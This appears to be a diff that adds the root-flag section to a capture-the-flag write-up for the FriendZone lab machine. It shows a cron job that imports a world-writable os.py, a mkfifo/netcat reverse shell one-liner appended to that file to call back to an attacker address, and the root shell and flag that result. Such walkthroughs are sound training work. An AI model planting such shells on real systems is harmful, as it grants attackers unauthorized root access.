@@ -299,11 +299,57 @@ db_name=FZ
 www-data@FriendZone:/$ 
 ```
 
+### Root Flag 
 
+Look for files with 777 permissions
 
-
-I also found a password for the backend samba database, located in `/var/lib/ucf/cache/`
+Command
 ```
-tdbsam
+find / -type f -perm -0777 -ls 2>/dev/null
+
+20473     28 -rwxrwxrwx   1 root     root        25910 Jan 15  2019 /usr/lib/python2.7/os.py
+
 ```
 
+We find a python script - os.py. This python script is owned by root but anyone can execute it. 
+
+The os python script is a module that allows for system interaction. 
+
+Enumerate processes and cron jobs
+```
+ps auxwf | grep cron
+
+root        404  0.0  0.3  31320  3172 ?        Ss   Jan24   0:00 /usr/sbin/cron -f
+friend    18204  0.0  0.1  14428  1004 pts/0    S+   02:21   0:00  | 
+```
+
+Download the `pspy64` script and put it in the Development directory
+
+Execute it on the target machine
+![[Pasted image 20240124203830.png]]
+
+A python script `/opt/server_admin/reporter.py` is being executed by root via a cron job. It is also importing the os module we previously discovered that can be run by everyone.
+
+Append the below reverse shell one liner to the end of the os.py file. When cron executes this file, we will gain root access. Why? Because the reporter.py script is ran with root privileges.
+
+```
+echo "system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.46 8000 >/tmp/f')" >> /usr/lib/python2.7/os.py
+```
+
+
+```
+nc -nlvp 8000
+
+listening on [any] 8000 ...
+connect to [10.10.14.46] from (UNKNOWN) [10.10.10.123] 36112
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls -l
+total 8
+drwxr-xr-x 2 root root 4096 Sep 13  2022 certs
+-rw-r----- 1 root root   33 Jan 24 02:57 root.txt
+# cat root.txt
+9d86a176fc4273ea6a02299398222c84
+# 
+```
